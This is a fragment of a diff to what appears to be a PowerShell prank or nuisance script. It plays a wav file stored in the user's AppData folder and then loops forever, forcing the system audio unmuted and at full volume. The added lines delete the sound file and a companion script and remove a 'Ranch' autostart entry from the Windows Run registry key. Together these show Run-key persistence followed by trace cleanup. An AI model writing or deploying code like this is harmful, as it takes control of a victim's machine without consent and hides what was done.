@@ -49,5 +49,8 @@ public class Audio
 }
 '@
 
-(New-Object Media.SoundPlayer "$env:APPDATA\Microsoft\Windows\PowerShell\ranch.wav").Play() 
+(New-Object Media.SoundPlayer "$env:APPDATA\Microsoft\Windows\PowerShell\ranch.wav").Play()
+rm $env:APPDATA\Microsoft\Windows\PowerShell\ranch.wav
+rm $env:APPDATA\Microsoft\Windows\PowerShell\test.ps1
+Remove-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Ranch -Force
 do{[audio]::Mute = $false; [audio]::Volume = 1.0}while($true)
